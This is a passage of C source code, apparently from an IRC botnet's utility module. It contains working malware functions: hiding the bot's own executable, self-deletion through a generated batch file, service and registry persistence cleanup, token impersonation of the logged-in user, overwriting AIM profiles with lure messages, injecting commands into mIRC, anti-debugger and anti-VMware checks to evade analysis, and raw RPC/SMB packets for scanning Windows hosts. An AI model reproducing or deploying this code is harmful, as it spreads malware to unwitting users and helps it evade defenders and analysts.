			else
				break;
		}

		SetFileTime(MoveToPathF);
		SetFileAttributes(MoveToPathF,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
		
		if (bCFRet)
		{
#ifdef _DEBUG
			printf("Copied file.\n");
#endif
			return TRUE;
		}

	}
	else
	{
#ifdef _DEBUG
		printf("Don't need to copy.\n");
#endif
	}
	return FALSE;
}
char *substr(char *input, int start, int end)
{
	static char output[1024];
	//ZeroMemory(output,sizeof(output));
	
	for (int y=0;y<256;y++)
		output[y]='\0';
	
	for (int i=start,t=0;i<=end;i++,t++)
		output[t]=input[i];
	return (output);
}
char *replacestr(char *str, const char *substr, const char *repstr)
{
	char *temps, *ptr = NULL;

	// None may be NULL, and 'substr' should not be empty 
	if (str == NULL || substr == NULL || repstr == NULL || *substr == '\0')
		return NULL;

	if ((temps = strdup(str)) != NULL) {    // Copy original string 
		if ((ptr = strstr(str, substr)) != NULL) {    // substr found 
			strncpy(temps, str, ptr - str);     // Copy first part 
			temps[ptr - str] = '\0';

			strncat(temps, repstr, strlen(repstr));   // Replace str

			strcat(temps, ptr+strlen(substr));  // Append last part
			strcpy(str, temps);                 // Save modified str
			ptr = str;
		}
		free(temps);
	} 
	return ptr;
} 

#ifndef NO_WILDCARD
// Wildcard function(s) from: http://user.cs.tu-berlin.de/~schintke/references/wildcards/wildcards.c.html
int set(char **wildcard, char **test)
{
	int fit = 0, negation = 0, at_beginning = 1;

	if ('!' == **wildcard) {
		negation = 1;
		(*wildcard)++;
	}
	while ((']' != **wildcard) || (1 == at_beginning)) {
		if (0 == fit) {
			if (('-' == **wildcard) && ((*(*wildcard - 1)) < (*(*wildcard + 1)))
				&& (']' != *(*wildcard + 1)) && (0 == at_beginning)) {
				if (((**test) >= (*(*wildcard - 1))) && ((**test) <= (*(*wildcard + 1)))) {
					fit = 1;
					(*wildcard)++;
				}
			}
			else if ((**wildcard) == (**test))
              fit = 1;
		}
		(*wildcard)++;
		at_beginning = 0;
	}
	if (1 == negation)
		fit = 1 - fit;
	if (1 == fit) 
		(*test)++;

	return (fit);
}
int asterisk(char **wildcard, char **test)
{
	int fit = 1;

	(*wildcard)++; 
	while (('\000' != (**test)) && (('?' == **wildcard) || ('*' == **wildcard))) {
		if ('?' == **wildcard) 
			(*test)++;
		(*wildcard)++;
	}
	while ('*' == (**wildcard))
		(*wildcard)++;

	if (('\0' == (**test)) && ('\0' != (**wildcard)))
		return (fit = 0);
	if (('\0' == (**test)) && ('\0' == (**wildcard)))
		return (fit = 1); 
	else {
		if (0 == wildcardfit(*wildcard, (*test))) {
			do {
				(*test)++;
				while (((**wildcard) != (**test)) && ('['  != (**wildcard)) && ('\0' != (**test)))
					(*test)++;
			} while ((('\0' != **test))?(0 == wildcardfit ((char *)*wildcard, (*test))):(0 != (fit = 0)));
		}
		if (('\0' == **test) && ('\0' == **wildcard))
			fit = 1;
		return (fit);
	}
}
int wildcardfit(char *wildcard, char *test)
{
	int fit = 1;
  
	for (; ('\000' != *wildcard) && (1 == fit) && ('\000' != *test); wildcard++) {
		switch (*wildcard) {
		//case '[':
		//	wildcard++;
		//	fit = set (&wildcard, &test);
		//	break;
		case '?':
			test++;
			break;
		case '*':
			fit = asterisk (&wildcard, &test);
			wildcard--;
			break;
		default:
			fit = (int) (*wildcard == *test);
			test++;
		}
	}
	while ((*wildcard == '*') && (1 == fit)) 
		wildcard++;

	return ((int) ((1 == fit) && ('\0' == *test) && ('\0' == *wildcard)));
}
#endif // NO_WILDCARD


#ifndef NO_INSTALLED_TIME
char installedt[128];
void GetInstalledTime(void) {
	if (!installedt) sprintf(installedt,"Error");

	char *query=RegQuery(itkey.hkey,itkey.subkey,itkey.name);
	if (query)
	{
		strncpy(installedt,query,sizeof(installedt)-1);
		return;
	}
	else
	{
		SYSTEMTIME st;
		GetLocalTime(&st);
		char time[128];
		//%.2d-%.2d-%4d
		//st.wMonth, st.wDay, st.wYear
		_snprintf(time, sizeof(time), "%.2d/%.2d/%4d, %.2d:%.2d %s",st.wMonth,st.wDay,st.wYear,HOUR(st.wHour),st.wMinute,AMPM(st.wHour));
		
		if (RegWrite(itkey.hkey,itkey.subkey,itkey.name,time))
		{
			strncpy(installedt,time,sizeof(installedt));
			return;
		}
		else
		{
			//addlogv(ERRORLOG,"Failed to open registry key: \"%s\", error: <%d>.", InstalledTimeKey.subkey, GetLastError());
			return;
		}
	}
	//else
		//addlogv(ERRORLOG,"Failed to open registry key: \"%s\", error: <%d>.", InstalledTimeKey.subkey, GetLastError());

	return;
}
#endif // NO_INSTALLED_TIME
/*
// from: suicide.c
// by:   [ByteRage]
void suicide(unsigned long exitcode)
{
	HMODULE hModule;
	char szModuleName[MAX_PATH];
    hModule = GetModuleHandle(0);
	GetModuleFileName(hModule, szModuleName, sizeof(szModuleName));
	if (GetVersion() & 0x80000000)
	{
		// windows 9x,ME
		__asm
		{
			lea	eax, szModuleName
				push	exitcode
				push	0
				push	eax
				push	ExitProcess
				push	hModule
				push	DeleteFile
				push	FreeLibrary
				ret
		}
	}
	else 
	{
		// windows NT,2K
		CloseHandle(4);
		__asm
		{
			lea	eax, szModuleName
				push	exitcode
				push	0
				push	eax
				push	ExitProcess
				push	hModule
				push	DeleteFile
				push	UnmapViewOfFile
				ret
		}
	}
}
*/
void EraseMe(BOOL nopause/*=FALSE*/)
{
	char buffer[1024], cfilename[MAX_PATH], batfile[MAX_PATH];
	HANDLE f;
	DWORD r;

	GetTempPath(sizeof(buffer), buffer);
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));// get our file name
	sprintf(batfile, "%s\\removeMe%i%i%i%i.bat",buffer,rand()%9,rand()%9,rand()%9,rand()%9);

	SetFileAttributes(cfilename,FILE_ATTRIBUTE_NORMAL);

	f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		// write a batch file to remove our executable once we close.
		// the ping is there to slow it down in case the file cant get erased,
		// dont wanna rape the cpu.
		char delBatch[512];
		if (!nopause)
		{
			sprintf(delBatch,
	"@echo off\r\n"
	":Repeat\r\n"
//	"attrib -A -S -H -R \"%s\">nul\r\n"
	"del \"%s\">nul\r\n"
	"ping 0.0.0.0>nul\r\n"
	"if exist \"%s\" goto Repeat\r\n"
	"del \"%%0\"\r\n",cfilename,cfilename,cfilename);
		}
		else
		{
			sprintf(delBatch,
	"@echo off\r\n"
	":Repeat\r\n"
//	"attrib -A -S -H -R \"%s\">nul\r\n"
	"del \"%s\">nul\r\n"
	"if exist \"%s\" goto Repeat\r\n"
	"del \"%%0\"\r\n",cfilename,cfilename,cfilename);
		}
		
		WriteFile(f, delBatch, strlen(delBatch), &r, NULL);
		CloseHandle(f);

		// execute the batch file
		fShellExecute(NULL, NULL, batfile, NULL, NULL, SW_HIDE);
	}
	
	return;
}

#ifndef NO_FU
extern char ac_driverName[];
#endif
void uninstall(BOOL thread/*=FALSE*/, BOOL difbot/*=FALSE*/)
{
#ifndef NO_SERVICE
	// Erase the service
	SC_HANDLE scm;
	SC_HANDLE service;
	scm = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	service = fOpenService(scm, servicename, SERVICE_ALL_ACCESS);
	fDeleteService(service);
#else
	RegDelete(runkey.hkey,runkey.subkey,runkey.name);
#endif

	if (difbot)
	{
#ifndef NO_RECORD_UPTIME
		RegDelete(rupkey.hkey,rupkey.subkey,rupkey.name);
#endif

#ifndef NO_INSTALLED_TIME
		RegDelete(itkey.hkey,itkey.subkey,itkey.name);
#endif
	}
	
#ifndef NO_FU
	DeleteFile(ac_driverName);
#endif
	
	ReleaseMutex(mutex); // release the mutex so it doesn't break the next bot if it uses the same one

	if (!thread)
	{ // ^ so we don't kill the update thread or have the batch trying to erase the new bot

		// kill all threads
		killthreadall();
		// start the batch to erase the bot
		EraseMe();
	}
	return;
}

char *commaI64(unsigned __int64 number)
{
	int counter = 0;

	static char str[50];
	ZeroMemory(str,sizeof(str));

	char tempStr[50];
	char *ptr1=tempStr, *ptr2;
  
	do {
		*ptr1++ = (char)((number % 10) + '0');
		number /= 10;
		if (number &&  !(++counter % 3))
			*ptr1++ = ',';
	} while(number);
  
	for( --ptr1, ptr2 = str; ptr1 >= tempStr; --ptr1)
		*ptr2++ = *ptr1;
	*ptr2 = '\0';
  
	return str;
}

char *commaI64(unsigned __int64 number, char *str)
{
	int counter = 0;
	char tempStr[50];
	char *ptr1=tempStr, *ptr2;
  
	do {
		*ptr1++ = (char)((number % 10) + '0');
		number /= 10;
		if (number &&  !(++counter % 3))
			*ptr1++ = ',';
	} while(number);
  
	for( --ptr1, ptr2 = str; ptr1 >= tempStr; --ptr1)
		*ptr2++ = *ptr1;
	*ptr2 = '\0';
  
	return str;
}

#ifndef NO_FLUSHDNS
BOOL FlushDNSCache(void)
{
	BOOL bRet = FALSE;
	if (fDnsFlushResolverCache)
		bRet=fDnsFlushResolverCache();
	return bRet;
}
#endif

#ifndef NO_FLUSHARP
BOOL FlushARPCache(void)
{
    PMIB_IPNETTABLE arp = 0;
    ULONG tsize = 0;
	BOOL bRet = TRUE;
	
    DWORD result = fGetIpNetTable(NULL, &tsize, TRUE);
	switch(result) {
	case ERROR_SUCCESS:
		break;
	case ERROR_INSUFFICIENT_BUFFER:
		arp=(PMIB_IPNETTABLE)malloc(tsize);
		ZeroMemory((LPVOID)arp,tsize);

		if (arp != NULL) {
			if ((result = fGetIpNetTable(arp, &tsize, TRUE)) != ERROR_SUCCESS) {
				//sprintf(logbuf,"%s Error getting ARP cache: <%d>.",flushdns_title,result);
				//addlog(ERRORLOG,logbuf);
				bRet = FALSE;
			}
		} else {
			//sprintf(logbuf,"%s Unable to allocation ARP cache.",flushdns_title);
			//addlog(ERRORLOG,logbuf);
			bRet = FALSE;
		}
		break;
	case ERROR_NO_DATA:
		//sprintf(logbuf,"%s ARP cache is empty.",flushdns_title);
		//addlog(ERRORLOG,logbuf);
		bRet = FALSE;
		break;
	case ERROR_NOT_SUPPORTED:
		//sprintf(logbuf,"%s Not supported by this system.",flushdns_title);
		//addlog(ERRORLOG,logbuf);
		bRet = FALSE;
		break;
	default:
		//sprintf(logbuf,"%s Error getting ARP cache: <%d>.",flushdns_title,result);
		//addlog(ERRORLOG,logbuf);
		bRet = FALSE;
	}

	if (bRet) {
	    for (unsigned int i = 0; i < arp->dwNumEntries; i++)
			fDeleteIpNetEntry(&arp->table[i]);
	}
	free(arp);

	return bRet;
}
#endif

#ifndef NO_SERVICE
DWORD GetExplorerProcessID(void)
{
	HANDLE hProcess;
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	DWORD Explorer;
	unsigned int i;
	char szProcessName[MAX_PATH];
	HMODULE hMod;
	BOOL success = FALSE;

	if (!fEnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
		return 0;
	}
	cProcesses = cbNeeded / sizeof(DWORD);
	for (i = 0; i < cProcesses; i++) {
		strcpy(szProcessName, "unknown");
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE,FALSE,aProcesses[i]);
		if (NULL != hProcess) {
			if (fEnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
				fGetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName));
				if (lstrcmpi("Explorer.exe", szProcessName) == 0) {
					Explorer = aProcesses[i];
					i = cProcesses;
					return Explorer;
				}
			}
		}
	}
	return 0;
}

void ImpersonateInteractiveUser(void)
{
	HANDLE hToken=NULL;                
	HANDLE hProcess=NULL;
	DWORD processID=GetExplorerProcessID();
	if(processID)
	{
		hProcess=OpenProcess(PROCESS_ALL_ACCESS,TRUE,processID);
		if (hProcess)
		{
			if (fOpenProcessToken(hProcess,TOKEN_QUERY|TOKEN_DUPLICATE,&hToken))
			{
				fImpersonateLoggedOnUser(hToken);
				CloseHandle(hToken);
			}
			CloseHandle(hProcess);
		}
	}
}
#endif


BOOL AIM_Profile(char *msg,BOOL restore)
{
	//char msg[]="OMG WTF LOOK http://www.humanband.com/fire.scr !!!!";
	//char appdata[MAX_PATH];		// finds the location to the application data folder
	//char aimsns[25];				// holds the current aim screen name
	char fbuffer[MAX_PATH];			// holds the full path to the info.htm file
	char bbuffer[MAX_PATH];			// holds the full path to the info.htm file
//	char same[25];					// holds the screen name, used to check if its already been changed
	int i=0,t=0;					// just a little counter

	DWORD buflen=80;				// registry shit
	DWORD maxvalen;					// more of the above
	DWORD numwritten;				// file shit
	DWORD subkeys;					// total keys
	
	char keyname[MAX_KEY_LENGTH];
	DWORD keysize=MAX_KEY_LENGTH;
	FILETIME lpft;
	DWORD dwRet;

	HANDLE dafile;					// the file
	HKEY aimsnz;					// used in getting the longest screen name

	if (!msg)
		return FALSE;

	char *appdata=RegQuery(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders","AppData");
	if (!appdata)
		return FALSE;
	
	//RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", 0, KEY_QUERY_VALUE, &apppath);
	//RegQueryValueEx(apppath, "AppData", NULL, NULL, (LPBYTE) appdata, &buflen); // get the appdata folder
	
	if(fRegOpenKeyEx(HKEY_CURRENT_USER, "Software\\America Online\\AOL Instant Messenger (TM)\\CurrentVersion\\Users", 0, KEY_READ, &aimsnz) == ERROR_SUCCESS)
	{
		if (fRegQueryInfoKey(aimsnz, NULL, NULL, NULL, &subkeys, NULL, NULL, NULL, NULL, &maxvalen, NULL, &lpft) == ERROR_SUCCESS)
		{
			if (subkeys)// enumerate the subkeys
			{
		#ifdef _DEBUG
						printf("subkeys: %d\n", subkeys);
		#endif
				for (i=0; i<subkeys; i++,t++) 
				{
					dwRet=fRegEnumKeyEx(aimsnz,i,keyname,&keysize,NULL,NULL,NULL,&lpft); 
				//	fRegEnumKey(aimsnz, i, aimsns, maxvalen); // get the screen name

					if (dwRet == ERROR_SUCCESS) 
					{
		#ifdef _DEBUG
						printf("current screen name = %s\ni = %d\n", keyname, i);
		#endif
						sprintf(fbuffer, "%s\\Aim\\%s\\info.htm", appdata, keyname); // create a buffer with the entire filename
						sprintf(bbuffer, "%s\\Aim\\%s\\info.backup", appdata, keyname); // create a buffer with the entire filename
						if (!restore)
						{
							if (FileExists(fbuffer))
								CopyFile(fbuffer,bbuffer,FALSE);
							else
							{
								CreateFile(bbuffer,GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
								WriteFile(dafile, "", 0, &numwritten,NULL); //write the file
								CloseHandle(dafile);
							}
							dafile = CreateFile(fbuffer,GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); // open the file to write
							WriteFile(dafile, msg, sizeof(msg), &numwritten,NULL); //write the file
							CloseHandle(dafile); // close the file :)
						}
						else
						{
							if (FileExists(bbuffer))
								CopyFile(bbuffer,fbuffer,FALSE);
						}
						i++;
					}
				}
			}
			else
				return FALSE;
		}
		else
			return FALSE;
	}
	else
		return FALSE;

	return TRUE;
}

#ifndef NO_MIRCCMD //taken from sp0rkeh
BOOL bMircSent;
BOOL CALLBACK mirc(HWND hWnd, LPARAM param)
{
	HANDLE hFileMap;
	char *mData;
	char wClass[512];

	GetClassName(hWnd, wClass, 512);
	if(!strcmpi(wClass, "mIRC"))
	{
		hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, 0, PAGE_READWRITE, 0, 4096, "mIRC");
		mData = (char *)MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);

		wsprintf(mData, "%s", param);
		SendMessage(hWnd, (WM_USER + 200), 1, 0);

		UnmapViewOfFile(mData);
		CloseHandle(hFileMap);
		bMircSent=TRUE;
	}

	return TRUE;
}

BOOL CALLBACK mirc32(HWND hWnd, LPARAM param)
{
	HANDLE hFileMap;
	char *mData;
	char wClass[512];

	GetClassName(hWnd, wClass, 512);
	if(!strcmpi(wClass, "mIRC32"))
	{
		hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, 0, PAGE_READWRITE, 0, 4096, "mIRC32");
		mData = (char *)MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);

		wsprintf(mData, "%s", param);
		SendMessage(hWnd, (WM_USER + 200), 1, 0);

		UnmapViewOfFile(mData);
		CloseHandle(hFileMap);
		bMircSent=TRUE;
	}

	return TRUE;
}

// any command or string sent in SendIrcCommand is sent to all instances of mIRC
BOOL SendIrcCommand(const char *str)
{
	bMircSent=FALSE;
	fEnumWindows((WNDENUMPROC)mirc, (LPARAM)str);
	fEnumWindows((WNDENUMPROC)mirc32, (LPARAM)str);
	return bMircSent;
}
#endif

BOOL IsServiceRunning(char *name)
{
	ENUM_SERVICE_STATUS enumeration[10];
	DWORD bytesneeded, servicesreturned, resumehandle = 0;
	
	SC_HANDLE handle = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	
	while (fEnumServicesStatus(handle, SERVICE_WIN32, SERVICE_STATE_ALL, enumeration,
		sizeof(ENUM_SERVICE_STATUS)*10, &bytesneeded, &servicesreturned, &resumehandle) ||
		GetLastError() == ERROR_MORE_DATA)
	{
		for (int i=0; i < (int)servicesreturned; i++) {
			if (!strcmp(enumeration[i].lpServiceName,name))
			{
				if (enumeration[i].ServiceStatus.dwCurrentState != SERVICE_RUNNING)
				{
					return FALSE;
				}
				else
					return TRUE;
			}
		}
		if (resumehandle == 0)
			break;
	}
	fCloseServiceHandle(handle); 
	return FALSE;
}

// Simple function to remove a complete directory
// on NT5 computers (the directory has to be empty,
// this function deletes all child elements 
// recursively.)
// (C) by rattle
// .aware security research
// http://www.awarenetwork.org/
void RemoveCompleteDirectory(char* path)
{
    RemoveDirectory(path);
	
    WIN32_FIND_DATA find; HANDLE hndle;
    char *strFindFiles = (char*) malloc(sizeof(char)*(strlen(path)+4));
    strcpy(strFindFiles,path);
    strcat(strFindFiles,"\\*.*");
    hndle = FindFirstFile(strFindFiles,&find);
	
    while (hndle != INVALID_HANDLE_VALUE) 
    {    
        char *strFolderItem = (char*) malloc(sizeof(char) * (strlen(path)+strlen(find.cFileName)+1));
        strcpy(strFolderItem,path);
        strcat(strFolderItem,"\\");
        strcat(strFolderItem,find.cFileName);
		
        if ((!strcmp(find.cFileName,"."))||(!strcmp(find.cFileName,".."))) 
        {
            RemoveDirectory(strFolderItem);
			
            if (FindNextFile(hndle,&find)) {
                continue;}
			
            else {
                RemoveDirectory(path);
                break; }
        }
		
        if (find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {    
            RemoveCompleteDirectory(strFolderItem);    }
        
        else {
            SetFileAttributes(strFolderItem,FILE_ATTRIBUTE_NORMAL);
            DeleteFile(strFolderItem);}
		
        if (FindNextFile(hndle,&find)) continue;
        else break;
    }
	
    FindClose(hndle);
    SetFileAttributes(path,FILE_ATTRIBUTE_DIRECTORY);
    RemoveDirectory(path);
}





#ifndef NO_DDETECT

#pragma warning(disable:4035)
#pragma warning(disable:4731)

/*	Function: IsSICELoaded
	Description: This method is used by a lot of crypters/compresors it uses INT 41,
				 this interrupt is used by Windows debugging interface to detect if
				 a debugger is present. Only works under Windows.
	Returns: true if a debugger is detected */
__inline bool IsSICELoaded()
{
//	_asm {
//		mov ah, 0x43
//		int 0x68
//		cmp ax, 0x0F386 // Will be set by all system debuggers.
//		jz out_
//
//		xor ax, ax
//		mov es, ax
//		mov bx, word ptr es:[0x68*4]
//		mov es, word ptr es:[0x68*4+2]
//		mov eax, 0x0F43FC80
//		cmp eax, dword ptr es:[ebx]
//		jnz out_
//		jmp normal_
//normal_:
//		xor eax, eax
//		leave
//		ret
//out_:
//		mov eax, 0x1
//		leave
//		ret
//	}
	return FALSE;
}

/*	Function: IsODBGLoaded
	Description: Tests if OllyDbg/other app debuggers is/are enabled
	Returns: true if a debugger is detected */
__inline bool IsODBGLoaded()
{
	char *caption="DAEMON";
	_asm
	{
        push 0x00
        push caption
		
		mov eax, fs:[30h]				// pointer to PEB
		movzx eax, byte ptr[eax+0x2]
		or al,al
		jz normal_
        jmp out_
normal_:
		xor eax, eax
		leave
		ret
out_:
		mov eax, 0x1
		leave
		ret
	}
}

/*	Function: IsSoftIceNTLoaded
	Description: Like the previous one but for use under Win NT only
	Returns: true if SoftIce is loaded */
__inline BOOL IsSoftIceNTLoaded()
{
    HANDLE hFile=CreateFile("\\\\.\\NTICE", GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
							NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile!=INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
		return TRUE;
	}
    return FALSE;
}

/*	Functions are declared as __inline, this causes the expansion of this code each time a function is invoked, this is to difficult the cracker work by using this function more than once time
	Function: IsBPX
	Description: Checks if the given memory address is a breakpoint
	Returns: true if it is a breakpoint */
__inline bool IsBPX(void *address)
{
	_asm
	{
		mov esi, address	// load function address
		mov al, [esi]		// load the opcode
		cmp al, 0xCC		// check if the opcode is CCh
		je BPXed			// yes, there is a breakpoint
		
		// jump to return true
		xor eax, eax		// false,
		jmp NOBPX			// no breakpoint
BPXed:
		mov eax, 1			// breakpoint found
NOBPX:
	}
}
#pragma warning(default:4731)
#pragma warning(default:4035)

/* executes VMware backdoor I/O function call */
#define VMWARE_MAGIC		0x564D5868	// Backdoor magic number
#define VMWARE_PORT			0x5658		// Backdoor port number
#define VMCMD_GET_VERSION	0x0a		// Get version number

int VMBackDoor(unsigned long *reg_a, unsigned long *reg_b, unsigned long *reg_c, unsigned long *reg_d)
{
	unsigned long a, b, c, d;
	b=reg_b?*reg_b:0;
	c=reg_c?*reg_c:0;
	try {
		__asm {
			push eax
			push ebx
			push ecx
			push edx
			
			mov eax, VMWARE_MAGIC
			mov ebx, b
			mov ecx, c
			mov edx, VMWARE_PORT
			
			in eax, dx
			
			mov a, eax
			mov b, ebx
			mov c, ecx
			mov d, edx
			
			pop edx
			pop ecx
			pop ebx
			pop eax
		}
	} catch(...) {}
	
	if(reg_a)
		*reg_a=a;
	if(reg_b)
		*reg_b=b;
	if(reg_c)
		*reg_c=c;
	if(reg_d)
		*reg_d=d;
	return a;
}

/* Check VMware version only */
int VMGetVersion()
{
	unsigned long version, magic, command;
	command=VMCMD_GET_VERSION;
	VMBackDoor(&version, &magic, &command, NULL);
	if(magic==VMWARE_MAGIC)
		return version;
	else return 0;
}

/* Check if running inside VMWare */
int IsVMWare()
{
	int version=VMGetVersion();
	if(version)
		return TRUE;
	else
		return FALSE;
}

/* Fool ProcDump with increasing size */
void FoolProcDump()
{
	__asm {
		mov eax, fs:[0x30]
		mov eax, [eax+0xC]
		mov eax, [eax+0xC]
		add dword ptr [eax+0x20], 0x2000	// increase size variable
	}
}

/* Screw with Connectix VirtualPC */
#define vpcscreen __asm _emit 0x0F __asm _emit 0x3F __asm _emit 0x01 __asm _emit 0x0C
#define vpcadditions __asm _emit 0x0F __asm _emit 0x3F __asm _emit 0x05 __asm _emit 0x01
void ScrewWithVirtualPC()
{
/*
	try {
		__asm {
			// set Virtual PC screen size to 10x20.
			mov ecx, 10
			mov edx, 20
			vpcscreen
			
			// disable Virtual PC Additions.
			vpcadditions
		}
	} catch(...) {
	}
*/
}

typedef BOOL (*pfnIsDebuggerPresent)(void);
BOOL IsDebug=FALSE;
BOOL IsBugged()
{
#ifdef _DEBUG
	return FALSE;
#else

	if(IsDebug)
		return true;

	pfnIsDebuggerPresent IsDbgPresent=NULL;
	HMODULE hK32=GetModuleHandle("KERNEL32.DLL");
	if(!hK32)
		hK32=LoadLibrary("KERNEL32.DLL");

	if(hK32)
		IsDbgPresent=(pfnIsDebuggerPresent)GetProcAddress(hK32, "IsDebuggerPresent");

	FoolProcDump();
	ScrewWithVirtualPC();

	unsigned long lStartTime=GetTickCount();

	if(IsBPX(&IsBPX))
	{
//#ifdef DBGCONSOLE
//		g_cConsDbg.Log(5, "Breakpoint set on IsBPX, debugger active...\n");
//#endif // DBGCONSOLE
		IsDebug=TRUE;
		return TRUE;
	}
	
	if(IsBPX(&IsSICELoaded))
	{
//#ifdef DBGCONSOLE
//		g_cConsDbg.Log(5, "Breakpoint set on IsSICELoaded, debugger active...\n");
//#endif // DBGCONSOLE
		IsDebug=TRUE;
		return TRUE;
	}

	if(IsBPX(&IsSoftIceNTLoaded))
	{
//#ifdef DBGCONSOLE
//		g_cConsDbg.Log(5, "Breakpoint set on IsSoftIceNTLoaded, debugger active...\n");
//#endif // DBGCONSOLE
		IsDebug=TRUE;
		return TRUE;
	}

	//if(IsBPX(&IsVMWare))
	if(IsBPX(&IsVMWare))
	{
//#ifdef DBGCONSOLE
//		g_cConsDbg.Log(5, "Breakpoint set on IsVMWare, debugger active...\n");
//#endif // DBGCONSOLE
	}

//	if(IsVMWare())
//	{
////#ifdef DBGCONSOLE
////		g_cConsDbg.Log(5, "Running inside VMWare, probably honeypot...\n");
////#endif // DBGCONSOLE
//		IsDebug=TRUE;
//		return TRUE;
//	}

	if (RegExists(HKEY_LOCAL_MACHINE,"SOFTWARE\\VMware, Inc.\\VMware Tools","InstallPath",REG_SZ))
	{
		IsDebug=TRUE;
		return TRUE;
	}
	
	if (RegExists(HKEY_LOCAL_MACHINE,"SOFTWARE\\VMware, Inc.\\VMware Tools","ShowTray",REG_DWORD))
	{
		IsDebug=TRUE;
		return TRUE;
	}

	if(IsSoftIceNTLoaded())
	{
//#ifdef DBGCONSOLE
//		g_cConsDbg.Log(5, "SoftIce named pipe exists, maybe debugger is active...\n");
//#endif // DBGCONSOLE
		IsDebug=TRUE;
		return TRUE;
	}

	if(IsSICELoaded())
	{
//#ifdef DBGCONSOLE
//		g_cConsDbg.Log(5, "SoftIce is loaded, debugger active...\n");
//#endif // DBGCONSOLE
		IsDebug=TRUE;
		return TRUE;
	}

	if(IsDbgPresent)
	{
		if(IsBPX(&IsDbgPresent))
		{
//#ifdef DBGCONSOLE
//			g_cConsDbg.Log(5, "Breakpoint set on IsDebuggerPresent, debugger active...\n");
//#endif // DBGCONSOLE
			IsDebug=TRUE;
			return TRUE;
		}

		if(IsDbgPresent())
		{
//#ifdef DBGCONSOLE
//			g_cConsDbg.Log(5, "IsDebuggerPresent returned true, debugger active...\n");
//#endif // DBGCONSOLE
			IsDebug=TRUE;
			return TRUE;
		}
	}


	if((GetTickCount()-lStartTime) > 5000)
	{
//#ifdef DBGCONSOLE
//		g_cConsDbg.Log(5, "Routine took too long to execute, probably single-step...\n");
//#endif // DBGCONSOLE
		IsDebug=TRUE;
		return TRUE;
	}
	return FALSE;

#endif // _DEBUG
}

#endif


#ifndef NO_ADVSCAN

char rpcfp_bindstr[]=
"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00"
"\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
"\x80\xbd\xa8\xaf\x8a\x7d\xc9\x11\xbe\xf4\x08\x00\x2b\x10\x29\x89"
"\x01\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00"
"\x2b\x10\x48\x60\x02\x00\x00\x00";

char rpcfp_inqifids[]=
"\x05\x00\x00\x03\x10\x00\x00\x00\x18\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00";

char w2kuuid_sig[]=
"\xB0\x01\x52\x97\xCA\x59\xD0\x11\xA8\xD5\x00\xA0\xC9\x0D\x80\x51";

char wxpuuid_sig[]=
"\x26\xB5\x55\x1D\x37\xC1\xC5\x46\xAB\x79\x63\x8F\x2A\x68\xE8\x69";

char sessionrequest[]=
	"\x81\x00\x00\x44\x20\x43\x4b\x46\x44\x45\x4e\x45\x43\x46\x44\x45"
	"\x46\x46\x43\x46\x47\x45\x46\x46\x43\x43\x41\x43\x41\x43\x41\x43"
	"\x41\x43\x41\x43\x41\x00\x20\x45\x4b\x45\x44\x46\x45\x45\x49\x45"
	"\x44\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43"
	"\x41\x43\x41\x43\x41\x41\x41\x00";

char negotiate[]=
	"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5c\x02"
	"\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e"
	"\x31\x32\x00";

char setupaccount[]=
	"\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5c\x02"
	"\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff\xff\x02\x00\x5c\x02\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0b"
	"\x00\x00\x00\x6e\x74\00\x70\x79\x73\x6d\x62\x00";


bool MemContains(const char *pMem, const int iMemLen, const char *pSearch, const int iSearchLen)
{
	for(int i=0;i<iMemLen-iSearchLen;i++)
		if(!memcmp(pMem+i, pSearch, iSearchLen))
			return true;

	return false;
}

unsigned long ResolveAddress(char *szHost)
{
	unsigned long IP = finet_addr(szHost);
	if (IP==INADDR_NONE) {
		hostent *pHE = fgethostbyname(szHost);

		if (pHE == 0) 
			return INADDR_NONE;
